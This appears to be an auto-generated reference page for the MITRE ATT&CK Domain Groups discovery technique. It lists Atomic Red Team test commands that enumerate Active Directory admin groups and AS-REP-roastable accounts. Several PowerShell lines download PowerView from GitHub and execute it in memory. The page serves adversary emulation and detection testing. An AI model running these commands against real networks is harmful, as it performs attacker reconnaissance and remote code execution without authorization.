
# Domain Groups

## Description

### MITRE Description

> Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.

Commands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['Linux', 'macOS', 'Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1069/002

## Potential Commands

```
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); Invoke-EnumerateLocalAdmin  -Verbose
net group /domai "Domain Admins"
net groups "Account Operators" /doma
net groups "Exchange Organization Management" /doma
net group "BUILTIN\Backup Operators" /doma
get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); Find-LocalAdminAccess -Verbose
net localgroup
net group /domain
net group "domain admins" /domain
get-ADPrincipalGroupMembership administrator | select name
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); Find-GPOComputerAdmin -ComputerName $env:COMPUTERNAME -Verbose
```

## Commands Dataset

```
[{'command': 'net localgroup\n'
             'net group /domain\n'
             'net group "domain admins" /domain\n',
  'name': None,
  'source': 'atomics/T1069.002/T1069.002.yaml'},
 {'command': 'get-ADPrincipalGroupMembership administrator | select name\n',
  'name': None,
  'source': 'atomics/T1069.002/T1069.002.yaml'},
 {'command': 'net group /domai "Domain Admins"\n'
             'net groups "Account Operators" /doma\n'
             'net groups "Exchange Organization Management" /doma\n'
             'net group "BUILTIN\\Backup Operators" /doma\n',
  'name': None,
  'source': 'atomics/T1069.002/T1069.002.yaml'},
 {'command': 'IEX (IWR '
             "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); "
             'Find-LocalAdminAccess -Verbose\n',
  'name': None,
  'source': 'atomics/T1069.002/T1069.002.yaml'},
 {'command': 'IEX (IWR '
             "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); "
             'Invoke-EnumerateLocalAdmin  -Verbose\n',
  'name': None,
  'source': 'atomics/T1069.002/T1069.002.yaml'},
 {'command': 'IEX (IWR '
             "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); "
             'Find-GPOComputerAdmin -ComputerName $env:COMPUTERNAME -Verbose',
  'name': None,
  'source': 'atomics/T1069.002/T1069.002.yaml'},
 {'command': 'get-aduser -f * -pr DoesNotRequirePreAuth | where '
             '{$_.DoesNotRequirePreAuth -eq $TRUE}\n',
  'name': None,
  'source': 'atomics/T1069.002/T1069.002.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Permission Groups Discovery: Domain Groups': {'atomic_tests': [{'auto_generated_guid': 'dd66d77d-8998-48c0-8024-df263dc2ce5d',
                                                                                          'description': 'Basic '
                                                                                                         'Permission '
                                                                                                         'Groups '
                                                                                                         'Discovery '
                                                                                                         'for '
                                                                                                         'Windows. '
                                                                                                         'This '
                                                                                                         'test '
                                                                                                         'will '
                                                                                                         'display '
                                                                                                         'some '
                                                                                                         'errors '
                                                                                                         'if '
                                                                                                         'run '
                                                                                                         'on '
                                                                                                         'a '
                                                                                                         'computer '
                                                                                                         'not '
                                                                                                         'connected '
                                                                                                         'to '
                                                                                                         'a '
                                                                                                         'domain. '
                                                                                                         'Upon '
                                                                                                         'execution, '
                                                                                                         'domain\n'
                                                                                                         'information '
                                                                                                         'will '
                                                                                                         'be '
                                                                                                         'displayed.\n',
                                                                                          'executor': {'command': 'net '
                                                                                                                  'localgroup\n'
                                                                                                                  'net '
                                                                                                                  'group '
                                                                                                                  '/domain\n'
                                                                                                                  'net '
                                                                                                                  'group '
                                                                                                                  '"domain '
                                                                                                                  'admins" '
                                                                                                                  '/domain\n',
                                                                                                       'name': 'command_prompt'},
                                                                                          'name': 'Basic '
                                                                                                  'Permission '
                                                                                                  'Groups '
                                                                                                  'Discovery '
                                                                                                  'Windows '
                                                                                                  '(Domain)',
                                                                                          'supported_platforms': ['windows']},
                                                                                         {'auto_generated_guid': '6d5d8c96-3d2a-4da9-9d6d-9a9d341899a7',
                                                                                          'description': 'Permission '
                                                                                                         'Groups '
                                                                                                         'Discovery '
                                                                                                         'utilizing '
                                                                                                         'PowerShell. '
                                                                                                         'This '
                                                                                                         'test '
                                                                                                         'will '
                                                                                                         'display '
                                                                                                         'some '
                                                                                                         'errors '
                                                                                                         'if '
                                                                                                         'run '
                                                                                                         'on '
                                                                                                         'a '
                                                                                                         'computer '
                                                                                                         'not '
                                                                                                         'connected '
                                                                                                         'to '
                                                                                                         'a '
                                                                                                         'domain. '
                                                                                                         'Upon '
                                                                                                         'execution, '
                                                                                                         'domain\n'
                                                                                                         'information '
                                                                                                         'will '
                                                                                                         'be '
                                                                                                         'displayed.\n',
                                                                                          'executor': {'command': 'get-ADPrincipalGroupMembership '
                                                                                                                  '#{user} '
                                                                                                                  '| '
                                                                                                                  'select '
                                                                                                                  'name\n',
                                                                                                       'name': 'powershell'},
                                                                                          'input_arguments': {'user': {'default': 'administrator',
                                                                                                                       'description': 'User '
                                                                                                                                      'to '
                                                                                                                                      'identify '
                                                                                                                                      'what '
                                                                                                                                      'groups '
                                                                                                                                      'a '
                                                                                                                                      'user '
                                                                                                                                      'is '
                                                                                                                                      'a '
                                                                                                                                      'member '
                                                                                                                                      'of',
                                                                                                                       'type': 'string'}},
                                                                                          'name': 'Permission '
                                                                                                  'Groups '
                                                                                                  'Discovery '
                                                                                                  'PowerShell '
                                                                                                  '(Domain)',
                                                                                          'supported_platforms': ['windows']},
                                                                                         {'auto_generated_guid': '0afb5163-8181-432e-9405-4322710c0c37',
                                                                                          'description': 'Runs '
                                                                                                         '"net '
                                                                                                         'group" '
                                                                                                         'command '
                                                                                                         'including '
                                                                                                         'command '
                                                                                                         'aliases '
                                                                                                         'and '
                                                                                                         'loose '
                                                                                                         'typing '
                                                                                                         'to '
                                                                                                         'simulate '
                                                                                                         'enumeration/discovery '
                                                                                                         'of '
                                                                                                         'high '
                                                                                                         'value '
                                                                                                         'domain '
                                                                                                         'groups. '
                                                                                                         'This\n'
                                                                                                         'test '
                                                                                                         'will '
                                                                                                         'display '
                                                                                                         'some '
                                                                                                         'errors '
                                                                                                         'if '
                                                                                                         'run '
                                                                                                         'on '
                                                                                                         'a '
                                                                                                         'computer '
                                                                                                         'not '
                                                                                                         'connected '
                                                                                                         'to '
                                                                                                         'a '
                                                                                                         'domain. '
                                                                                                         'Upon '
                                                                                                         'execution, '
                                                                                                         'domain '
                                                                                                         'information '
                                                                                                         'will '
                                                                                                         'be '
                                                                                                         'displayed.\n',
                                                                                          'executor': {'command': 'net '
                                                                                                                  'group '
                                                                                                                  '/domai '
                                                                                                                  '"Domain '
                                                                                                                  'Admins"\n'
                                                                                                                  'net '
                                                                                                                  'groups '
                                                                                                                  '"Account '
                                                                                                                  'Operators" '
                                                                                                                  '/doma\n'
                                                                                                                  'net '
                                                                                                                  'groups '
                                                                                                                  '"Exchange '
                                                                                                                  'Organization '
                                                                                                                  'Management" '
                                                                                                                  '/doma\n'
                                                                                                                  'net '
                                                                                                                  'group '
                                                                                                                  '"BUILTIN\\Backup '
                                                                                                                  'Operators" '
                                                                                                                  '/doma\n',
                                                                                                       'name': 'command_prompt'},
                                                                                          'name': 'Elevated '
                                                                                                  'group '
                                                                                                  'enumeration '
                                                                                                  'using '
                                                                                                  'net '
                                                                                                  'group '
                                                                                                  '(Domain)',
                                                                                          'supported_platforms': ['windows']},
                                                                                         {'auto_generated_guid': 'a2d71eee-a353-4232-9f86-54f4288dd8c1',
                                                                                          'description': 'Find '
                                                                                                         'machines '
                                                                                                         'where '
                                                                                                         'user '
                                                                                                         'has '
                                                                                                         'local '
                                                                                                         'admin '
                                                                                                         'access '
                                                                                                         '(PowerView). '
                                                                                                         'Upon '
                                                                                                         'execution, '
                                                                                                         'progress '
                                                                                                         'and '
                                                                                                         'info '
                                                                                                         'about '
                                                                                                         'each '
                                                                                                         'host '
                                                                                                         'in '
                                                                                                         'the '
                                                                                                         'domain '
                                                                                                         'being '
                                                                                                         'scanned '
                                                                                                         'will '
                                                                                                         'be '
                                                                                                         'displayed.\n',
                                                                                          'executor': {'command': 'IEX '
                                                                                                                  '(IWR '
                                                                                                                  "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); "
                                                                                                                  'Find-LocalAdminAccess '
                                                                                                                  '-Verbose\n',
                                                                                                       'name': 'powershell'},
                                                                                          'name': 'Find '
                                                                                                  'machines '
                                                                                                  'where '
                                                                                                  'user '
                                                                                                  'has '
                                                                                                  'local '
                                                                                                  'admin '
                                                                                                  'access '
                                                                                                  '(PowerView)',
                                                                                          'supported_platforms': ['windows']},
                                                                                         {'auto_generated_guid': 'a5f0d9f8-d3c9-46c0-8378-846ddd6b1cbd',
                                                                                          'description': 'Enumerates '
                                                                                                         'members '
                                                                                                         'of '
                                                                                                         'the '
                                                                                                         'local '
                                                                                                         'Administrators '
                                                                                                         'groups '
                                                                                                         'across '
                                                                                                         'all '
                                                                                                         'machines '
                                                                                                         'in '
                                                                                                         'the '
                                                                                                         'domain. '
                                                                                                         'Upon '
                                                                                                         'execution, '
                                                                                                         'information '
                                                                                                         'about '
                                                                                                         'each '
                                                                                                         'machine '
                                                                                                         'will '
                                                                                                         'be '
                                                                                                         'displayed.\n',
                                                                                          'executor': {'command': 'IEX '
                                                                                                                  '(IWR '
                                                                                                                  "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); "
                                                                                                                  'Invoke-EnumerateLocalAdmin  '
                                                                                                                  '-Verbose\n',
                                                                                                       'name': 'powershell'},
                                                                                          'name': 'Find '
                                                                                                  'local '
                                                                                                  'admins '
                                                                                                  'on '
                                                                                                  'all '
                                                                                                  'machines '
                                                                                                  'in '
                                                                                                  'domain '
                                                                                                  '(PowerView)',
                                                                                          'supported_platforms': ['windows']},
                                                                                         {'auto_generated_guid': '64fdb43b-5259-467a-b000-1b02c00e510a',
                                                                                          'description': 'takes '
                                                                                                         'a '
                                                                                                         'computer '
                                                                                                         'and '
                                                                                                         'determines '
                                                                                                         'who '
                                                                                                         'has '
                                                                                                         'admin '
                                                                                                         'rights '
                                                                                                         'over '
                                                                                                         'it '
                                                                                                         'through '
                                                                                                         'GPO '
                                                                                                         'enumeration. '
                                                                                                         'Upon '
                                                                                                         'execution, '
                                                                                                         'information '
                                                                                                         'about '
                                                                                                         'the '
                                                                                                         'machine '
                                                                                                         'will '
                                                                                                         'be '
                                                                                                         'displayed.\n',
                                                                                          'executor': {'command': 'IEX '
                                                                                                                  '(IWR '
                                                                                                                  "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); "
                                                                                                                  'Find-GPOComputerAdmin '
                                                                                                                  '-ComputerName '
                                                                                                                  '#{computer_name} '
                                                                                                                  '-Verbose',
                                                                                                       'name': 'powershell'},
                                                                                          'input_arguments': {'computer_name': {'default': '$env:COMPUTERNAME',
                                                                                                                                'description': 'hostname '
                                                                                                                                               'of '
                                                                                                                                               'the '
                                                                                                                                               'computer '
                                                                                                                                               'to '
                                                                                                                                               'analyze',
                                                                                                                                'type': 'Path'}},
                                                                                          'name': 'Find '
                                                                                                  'Local '
                                                                                                  'Admins '
                                                                                                  'via '
                                                                                                  'Group '
                                                                                                  'Policy '
                                                                                                  '(PowerView)',
                                                                                          'supported_platforms': ['windows']},
                                                                                         {'auto_generated_guid': '870ba71e-6858-4f6d-895c-bb6237f6121b',
                                                                                          'dependencies': [{'description': 'Computer '
                                                                                                                           'must '
                                                                                                                           'be '
                                                                                                                           'domain '
                                                                                                                           'joined.\n',
                                                                                                            'get_prereq_command': 'Write-Host '
                                                                                                                                  'Joining '
                                                                                                                                  'this '
                                                                                                                                  'computer '
                                                                                                                                  'to '
                                                                                                                                  'a '
                                                                                                                                  'domain '
                                                                                                                                  'must '
                                                                                                                                  'be '
                                                                                                                                  'done '
                                                                                                                                  'manually.\n',
                                                                                                            'prereq_command': 'if((Get-CIMInstance '
                                                                                                                              '-Class '
                                                                                                                              'Win32_ComputerSystem).PartOfDomain) '
                                                                                                                              '{exit '
                                                                                                                              '0} '
                                                                                                                              'else '
                                                                                                                              '{exit '
                                                                                                                              '1}\n'},
                                                                                                           {'description': 'Requires '
                                                                                                                           'the '
                                                                                                                           'Active '
                                                                                                                           'Directory '
                                                                                                                           'module '
                                                                                                                           'for '
                                                                                                                           'powershell '
                                                                                                                           'to '
                                                                                                                           'be '
                                                                                                                           'installed.\n',
                                                                                                            'get_prereq_command': 'Add-WindowsCapability '
                                                                                                                                  '-Online '
                                                                                                                                  '-Name '
                                                                                                                                  '"Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"\n',
                                                                                                            'prereq_command': 'if(Get-Module '
                                                                                                                              '-ListAvailable '
                                                                                                                              '-Name '
                                                                                                                              'ActiveDirectory) '
                                                                                                                              '{exit '
                                                                                                                              '0} '
                                                                                                                              'else '
                                                                                                                              '{exit '
                                                                                                                              '1}\n'}],
                                                                                          'dependency_executor_name': 'powershell',
                                                                                          'description': 'When '
                                                                                                         'successful, '
                                                                                                         'accounts '
                                                                                                         'that '
                                                                                                         'do '
                                                                                                         'not '
                                                                                                         'require '
                                                                                                         'kerberos '
                                                                                                         'pre-auth '
                                                                                                         'will '
                                                                                                         'be '
                                                                                                         'returned\n',
                                                                                          'executor': {'command': 'get-aduser '
                                                                                                                  '-f '
                                                                                                                  '* '
                                                                                                                  '-pr '
                                                                                                                  'DoesNotRequirePreAuth '
                                                                                                                  '| '
                                                                                                                  'where '
                                                                                                                  '{$_.DoesNotRequirePreAuth '
                                                                                                                  '-eq '
                                                                                                                  '$TRUE}\n',
                                                                                                       'elevation_required': False,
                                                                                                       'name': 'powershell'},
                                                                                          'name': 'Enumerate '
                                                                                                  'Users '
                                                                                                  'Not '
                                                                                                  'Requiring '
                                                                                                  'Pre '
                                                                                                  'Auth '
                                                                                                  '(ASRepRoast)',
                                                                                          'supported_platforms': ['windows']}],
                                                                        'attack_technique': 'T1069.002',
                                                                        'display_name': 'Permission '
                                                                                        'Groups '
                                                                                        'Discovery: '
                                                                                        'Domain '
                                                                                        'Groups'}}]
```

# Tactics


* [Discovery](../tactics/Discovery.md)


# Mitigations

None

# Actors


* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)

* [Ke3chang](../actors/Ke3chang.md)
    
* [FIN6](../actors/FIN6.md)
    
* [OilRig](../actors/OilRig.md)
    
* [Inception](../actors/Inception.md)
    
* [Wizard Spider](../actors/Wizard-Spider.md)
    
* [Turla](../actors/Turla.md)
    
